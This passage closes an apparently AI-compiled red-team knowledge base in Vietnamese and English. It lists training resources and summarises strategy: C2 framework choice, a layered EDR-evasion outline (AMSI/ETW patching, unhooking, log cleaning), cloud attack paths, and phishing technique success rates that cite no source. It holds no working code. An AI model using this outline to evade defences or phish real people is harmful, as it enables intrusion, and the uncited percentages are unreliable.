| **BOF Collection** | trustedsec/CS-Situational-Awareness-BOF |
| **Bof.NET** | CCob/Bof.NET |

### 3. Videos & Courses

- **RTO Course (Zero-Point Security):** Chi tiết nhất về Cobalt Strike + AD + evasion.
- **Sektor7 RTO Course:** RTO equivalent, go-language C2 development.
- **HackTheBox / Pro Labs:** Practical AD + red team labs.
- **Pentester Academy:** CRTP, CRTE courses.
- **TCM Security Practical Ethical Hacking:** Entry level pentest (PNPT).
- **Offensive Security Training:** OSCP, OSEP, OSED.
- **Cobalt Strike Training Videos** (on Cobalt Strike's YouTube).
- **LiveOverflow / IppSec:** CTF + writeups.
- **John Hammond:** Malware analysis + red team.

### 4. Books

- **"Red Team: How to Succeed by Thinking Like the Enemy"** — Micah Zenko. Not technical, strategic.
- **"Windows Internals, Part 1 & 2"** — Pavel Yosifovich, Alex Ionescu, Mark Russinovich. Windows OS fundamentals.
- **"The Art of Memory Forensics"** — Michael Hale Ligh. Memory analysis (for understanding detection).
- **"Practical Malware Analysis"** — Michael Sikorski, Andrew Honig. Reverse engineering fundamentals.
- **"The Hacker Playbook 3"** — Peter Kim. Practical penetration testing.
- **"Operator Handbook: Red Team + OSINT"** — Nico Leidecker (Red Team Ops).

### 5. Communities

- **r/redteam** — Reddit community.
- **r/netsec** — General security.
- **BloodHound Slack / Discord** — Active AD research community.
- **PentesterLab Discord** — Discussion + labs.
- **#red-team** (HackTheBox Discord) — Active daily.
- **The Mayor's Cyber Discord** — RTO, AD, C2 discussions.
- **Offensive Security Discord** — OSCP, OSEP discussions.

### 6. Threat Intel Sources

- **MITRE ATT&CK** (attack.mitre.org) — TTP database.
- **Sigma Rules** (github.com/SigmaHQ/sigma) — Detection rule repository.
- **Atomic Red Team** (atomicredteam.io) — Testable attack behaviors.
- **LOLBAS** (lolbas-project.github.io) — Living Off the Land Binaries and Scripts.
- **GTFOBins** (gtfobins.github.io) — Linux LOL bins.
- **MalwareBazaar** (bazaar.abuse.ch) — Malware samples.
- **VirusTotal** — File/URL scanning.
- **ANY.RUN** — Interactive sandbox.

---

## N. KEY INSIGHTS

### Synthesis — Kết Nối Red Team với Existing Skills

#### 1. Red Team + Web/Pentest — Sự Khác Biệt Quan Trọng

**From Pentester → Red Teamer:**
- **Mindset shift:** Không còn "find all bugs" → "achieve objective undetected."
- **Trade-off:** Detection avoidance > exploitation success. Một exploit hoạt động nhưng bị detect = fail.
- **Pacing:** Low-and-slow beats fast-and-loud. Một tuần recon + 5 phút exploit.
- **Infrastructure:** Web pentest dùng Burp + laptop. Red team cần VPS, domains, certs, redirectors.
- **Persistence:** Pentest không cần. Red team cần maintain access for days/weeks.

**Skill Overlap:**
- **Web exploitation (SQLi, XSS, RCE):** Initial access vectors.
- **API hacking:** Modern targets có APIs cho lateral movement.
- **Cloud (AWS/Azure/GCP):** Cloud C2, exfil, pivoting.
- **Network pentesting:** Pivoting, tunneling, port forwarding.

**New Skills to Acquire:**
- C2 framework operation (Cobalt Strike, Sliver, Havoc).
- C2 infrastructure setup (domains, redirectors, CDN).
- Windows internals (processes, memory, tokens, LSASS).
- AD exploitation (Kerberos, delegation, ACL).
- EDR/AV evasion (AMSI, ETW, syscalls, sleep mask).
- Tradecraft OPSEC (compartmentalization, burn management).

#### 2. The C2 Matrix — How to Choose Your Framework

| Scenario | Best Choice | Why |
|---|---|---|
| Budget no constraint, need maximum stealth | Nighthawk | Best evasion built-in |
| Team of 3-5 operators, enterprise engagement | Cobalt Strike | Mature, BOF ecosystem, community |
| Budget limited, OSS preferred | Sliver | Most OSS features, active development |
| Need cross-platform (Win/Mac/Lin) | Mythic (Poseidon/Atlas) | Multi-agent architecture |
| Solo operator, learning | Sliver + Havoc | Free, capable, growing |
| CTF / Personal projects | Mythic | Easy setup (Docker) |
| Evasion-focused solo op | Havoc | Built-in direct syscalls, sleep mask |

#### 3. The EDR Cat-and-Mouse Game

**Current State (2025-2026):**
- **EDR capabilities:** Kernel callbacks, ETW, AMSI, ML detection, automated response.
- **Red team countermeasures:** Direct syscalls, sleep masking, BOFs, threadless injection, modular stomping.
- **The Arms Race:** Mỗi evasion technique có counter-detection technique.

**Evasion Layering Strategy:**

```
Layer 0: Process-level evasion
├── Indirect syscalls (Hell's Gate / SysWhispers3)
├── AMSI patching
├── ETW patching
├── DLL unhooking (ntdll)
└── Stack spoofing

Layer 1: Memory-level evasion
├── RW → RX memory transitions (no RWX)
├── Heap obfuscation
├── Sleep mask (Ekko/Gargoyle)
└── Block memory scanning via VEH

Layer 2: Network-level evasion
├── C2 profile mimicry (malleable C2)
├── CDN redirectors
├── Let's Encrypt + cert pinning
└── Jitter + sleep variation

Layer 3: Behavior-level evasion
├── Low-and-slow lateral movement
├── Living off the land (LOLBins)
├── Minimal tool footprint
└── Log cleaning
```

**The Golden Rule:** Never rely on a single evasion technique. Layer them.

#### 4. Cloud + Red Team — The New Frontier

**Cloud-Native Red Teaming Skills:**
- **Cloud C2:** Lambda functions, serverless redirectors.
- **Container escape:** From container → host → cloud metadata.
- **Kubernetes pivoting:** Service account → cluster admin → cloud credentials.
- **Cloud credential abuse:** AWS keys → S3 exfil, EC2 abuse.
- **OAuth token theft:** OAuth apps, service principals.
- **Managed identity abuse:** Azure MSI, AWS instance profiles.

**Cloud Evasion:**
- **CloudTrail / CloudWatch:** Event tampering, log bypass.
- **GuardDuty / Sentinel:** Behavioral detection in cloud.
- **Network Access Controls:** Security groups, NSGs.
- **Cloud EDR:** CrowdStrike, SentinelOne cloud agents.

**Realization:** Red team trong cloud khác on-prem. Không có LSASS dumping, không có NTLM relay. Nhưng có cloud API abuse, OAuth token theft, managed identity exploitation.

#### 5. The Human Element — Why Social Engineering Still Works

**Despite all the technical sophistication, the most reliable initial access vector remains phishing.**

**Why:**
1. **Technical controls have gaps:** No EDR stops a user from typing their password.
2. **MFA fatigue:** Users click "Approve" without thinking.
3. **Business pressure:** "I need to open this attachment for work."
4. **Trust in brands:** People trust Microsoft, DocuSign, Zoom notifications.
5. **Urgency bias:** "Your account will be deleted" → panic → action.

**Red Team Social Engineering Stack:**

| Technique | Success Rate | Difficulty | Detection Risk |
|---|---|---|---|
| Spear phishing with pretext | 30-50% | Medium | Low |
| MFA push spam (MFA fatigue) | 15-30% | Low | Medium |
| SMS phishing (smishing) | 20-40% | Medium | Low |
| Voice phishing (vishing) | 10-25% | High | Low |
| Physical tailgating | 60-80% | High | High |
| USB drop | 5-20% | Low | Medium |
| Watering hole | 1-5% | Very High | Low |

#### 6. The Future of Red Team (2025+)

**Trends:**
1. **AI-driven red teaming:** LLM-generated phishing emails, automated evasion.
2. **Cloud-first engagements:** Kiến trúc mạng hybrid, cloud identities as attack surface.
3. **Zero Trust bypass:** Bypass beyondcorp, ZTNA, conditional access policies.
4. **AI/ML security:** Adversarial attacks on ML models used for detection.
5. **Supply chain compromise:** Third-party SaaS, CI/CD pipeline attacks.
6. **Ransomware simulation:** Tăng demand cho ransomware attack simulation.
7. **Cyber insurance compliance:** Red team reports required for insurance.

**Skill Gaps to Fill:**
- Cloud security (AWS, Azure, GCP).
- AI/ML basics (understanding detection models).
- CI/CD security (GitHub Actions, Jenkins, GitLab).
- Containers & Kubernetes (Docker escape, cluster compromise).
- Software supply chain (dependency confusion, package hijacking).
- Infrastructure-as-Code (Terraform, CloudFormation) abuse.

#### 7. Final Synthesis — The Red Team Mindset

**Core Principles:**

1. **"OPSEC is everything."** — Kỹ thuật tốt nhất không thành công nếu bị phát hiện trước khi kịp làm gì.

2. **"Know your enemy."** — Hiểu detection tools (MDE, CrowdStrike, SentinelOne) còn quan trọng hơn hiểu attack tools.

3. **"Simplicity is elegance."** — Complicated multi-stage attacks dễ hỏng hơn simple, reliable techniques. Lời khuyên: dùng PowerShell 2 dòng thay vì custom C++ loader 200 dòng.

4. **"Failing to plan = planning to fail."** — Infrastructure cần build trước 2 tuần, warm up domain, test redirectors, verify certs.

5. **"Document everything."** — Engagement log, screenshots, command output. Báo cáo cuối cùng cần detail.

6. **"Treat every engagement as a real operation."** — Professional distance, compartmentalize, clean up after.

7. **"The red team exists to make the blue team better."** — Collaboration > competition. Purple team mindset.

8. **"Keep learning or become irrelevant."** — EDR landscape changes monthly. New techniques, new bypasses, new detections. The moment you stop learning is the moment your skills become obsolete.

---

> **📌 END OF DOCUMENT**
> 
> Red Team & C2 Mastery — Comprehensive Knowledge Base
> Compiled by Hermes Agent, Nous Research
> Total: ~48 pages (condensed technical reference)
> 
> **Last updated:** May 2026
> **Next review:** When significant new TTPs emerge in the C2/EDR landscape.
